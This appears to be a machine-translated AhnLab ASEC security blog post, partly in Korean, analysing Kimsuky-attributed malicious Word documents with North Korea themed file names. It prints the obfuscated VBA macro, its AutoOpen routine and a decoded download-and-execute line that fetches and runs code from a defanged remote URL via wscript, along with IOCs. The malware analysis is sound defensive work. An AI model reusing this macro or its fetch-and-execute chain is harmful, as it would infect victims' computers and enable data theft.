@@ -1,0 +1,78 @@
+<div>
+Posted on
+<a href="https://asec-ahnlab-com.translate.goog/ko/33827/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="bookmark" title="10:33 am">April 27, 2022</a>
+<h1 class="title">Diplomatic/security-related word documents are being distributed</h1>
+<p></p>
+<p>The ASEC analysis team confirmed that malicious word documents with file names related to North Korea were continuously distributed.</p>
+<figure class="aligncenter size-large">
+<img alt="" class="wp-image-33853 jetpack-lazy-image jetpack-lazy-image--handled" height="1024" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="826"/>
+<img alt="" class="wp-image-33853" height="1024" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/04/image-17.png?resize=826%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="826"/>
+<figcaption>
+ [Figure 1] 220426-North Korea's foreign policy and our response direction (Dr. Jeong**).doc
+ </figcaption>
+</figure>
+<p>The word document contains malicious VBA macro code and is identified as the same type as the document file introduced in &lt; <a href="https://asec-ahnlab-com.translate.goog/ko/28180/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp">Checking the continued distribution of malicious words in the text related to North Korea</a> &gt; . The file names of Word documents that have been recently distributed are as follows.</p>
+<ul>
+<li>220426-North Korea's foreign policy and our response (Dr. Jeong**).doc (4/26)</li>
+<li>North Korea's foreign policy and our response.doc (4/26)</li>
+<li>China's foreign policy and our response.doc (4/22)</li>
+<li>Press Release - One Korea International Forum 2022 -20220422.docm (4/23)</li>
+<li>[Analytical data] North Korea's position on the use of nuclear force and the implications of changes in military elites through the 4.25 parade.docm (4/26)</li>
+</ul>
+<p>The verified macro code includes a code that accesses a specific URL and executes the received data. The following obfuscated string exists in the macro code identified in the 'North Korea's foreign policy and our response.doc' file.</p>
+<code class="language-ts">Function Unpck(idx)
+ sa = Array("pi^c$", "wi^n$m~g^mts^:w^in@3^2_$pro~ces`s", "1q^a$z~2^wsx^", "On^ $E~r^ror^ R^es@u^me$ Ne~xt:`Set@ m@x $= ^Cr^ea`teO`b`je~ct^(`""~Mi^cro^so~ft$.X`MLH$TT`P""~):`mx^.op$en@ ""`GE@T`"",` ^""~h^tt`p:/$/g0`0gl`edr^iv^e`.^myw@eb^com`mu~nit$y@.o~rg`/f^il~e~/up^lo`ad^/li`st$.p`h^p?$qu`ery$=^1""~, F$al@se~:mx$.S`end@:$Ex$e@cu`te(`mx.^re$spo`ns~eT`ex^t)", "\v^e$r~s^ion^.i^ni@", "ws^c$r~i^pt.^ex^e @/^/e$:vb~scr`ipt@ /@/b$ ")
+ Key = "@ $ ~ ` ^"
+ s = sa(idx)
+ arrkey = Split(Key)
+ For Each k In arrkey
+ s = Replace(s, k, "")
+ Next
+ Unpck = s
+End Function</code>
+<p>The obfuscated string is used by the AutoOpen() function, which is automatically executed when the word document is executed, and the decoded string is as follows.</p>
+<code class="language-ts">Sub AutoOpen()
+ On Error Resume Next
+ sn = Denor(0) 'pic
+ Set wm = GetObject(Denor(1)) 'winmgmts:win32_process
+ pw = Denor(2) '1qaz2wsx
+ Weed sn, pw
+ Present
+ Set wnd = ActiveDocument
+ wnd.Save
+ cnt = Denor(3) 'On Error Resume Next:Set mx = CreateObject("Microsoft.XMLHTTP"):mx.open "GET", "hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1", False:mx.Send:Execute(mx.responseText)
+ pth = Templates(1).Path &amp; Denor(4) '\version.ini
+ ResContent pth, cnt
+ wm.Create Denor(5) &amp; pth 'wscript.exe //e:vbscript //b 
+End Sub</code>
+<p>해당 매크로에도 &lt;<a href="https://asec-ahnlab-com.translate.goog/ko/28180/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp">대북 관련 본문 내용 악성 워드의 지속 유포 정황 확인</a>&gt;에서 확인되었던 문서보호 해제와 관련된 코드가 존재한다. 설정된 비밀번호 역시 1qaz2wsx 를 사용하고 있어 동일한 공격자가 제작한 것으로 추정된다.</p>
+<p>이후 %AppData%\Microsoft\Templates\ 폴더에 version.ini 파일을 생성한다. ini 파일 내부에는 다음과 같이 특정 URL에서 받아온 데이터를 실행하는 명령이 포함되어있다. 접속 URL에 list.php?query=1 가 포함되는 것 또한 해당 유형의 특징이다.</p>
+<code class="language-ts">On Error Resume Next:
+Set mx = CreateObject("Microsoft.XMLHTTP"):
+mx.open "GET", "hxxp://g00gledrive.mywebcommunity[.]org/file/upload/list.php?query=1", False:
+mx.Send:
+Execute(mx.responseText)</code>
+<p>생성된 ini 파일은 다음 명령어를 통해 실행된다.</p>
+<ul>
+<li>wscript.exe //e:vbscript //b %AppData%\Microsoft\Templates\version.ini</li>
+</ul>
+<p>현재 URL에 접속이 불가하여 이후 행위는 확인이 불가하지만 wscript.exe 실행 인자가 &lt;<a href="https://asec-ahnlab-com.translate.goog/ko/32765/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp">탄소배출 전문기업 타겟 워드문서 공격</a>&gt;에서 확인된 명령어와 동일한 것으로 보아 이와 유사하게 사용자 PC 정보 유출 등의 행위가 수행되었을 것으로 추정된다.</p>
+<p>해당 악성코드를 제작하는 것으로 추정되는 공격 그룹은 대북 관련 내용으로 악성 워드 문서를 지속적으로 유포하고 있어 관련 사용자들의 주의가 필요하다. 사용자는 출처가 불분명한 이메일의 첨부파일 실행 및 매크로 사용을 자제해야 한다.</p>
+<p>현재 V3에서는 해당 악성코드를 다음과 같이 진단하고 있다.</p>
+<p>[File Diagnosis]
+ Downloader/DOC.Kimsuky</p>
+<p>[IOC]
+ 657b538698483f43aada2e5e4bc4a91d (VBA) 
+cb2a18028055cdf1582c1c5ac3756203 (VBA) 
+0a0f858beeb6914aaf07896b7790a1d4 (VBA) 
+hxxp://g00gledrive.mywebcommunity.myartsonline 
+. file/upload/list.php?query=1</p>
+<p>Related IOCs and related detailed analysis information can be checked through AhnLab's next-generation threat intelligence platform 'AhnLab TIP' subscription service.</p>
+<figure class="aligncenter">
+<a href="https://translate.google.com/website?sl=auto&amp;tl=en&amp;hl=ru&amp;client=webapp&amp;u=https://atip.ahnlab.com/"><img alt="" class="wp-image-24876 jetpack-lazy-image" height="300" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2021/07/ASEC_Blog_bn_800x300-1.png?resize=800%2C300&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="800"/>
+<img alt="" class="wp-image-24876" height="300" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2021/07/ASEC_Blog_bn_800x300-1.png?resize=800%2C300&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="800"/>
+</a>
+</figure>
+<p>Categories: <a href="https://asec-ahnlab-com.translate.goog/ko/category/malware/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="category tag">Malware information</a> </p>
+<p>Tagged as: <a href="https://asec-ahnlab-com.translate.goog/ko/tag/kimsuky/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">Kimsuky</a> , <a href="https://asec-ahnlab-com.translate.goog/tag/vba-macro/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">VBA Macro</a> , <a href="https://asec-ahnlab-com.translate.goog/tag/word-document/?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=ru&amp;_x_tr_pto=wapp" rel="tag">Word Document</a></p>
+</div>
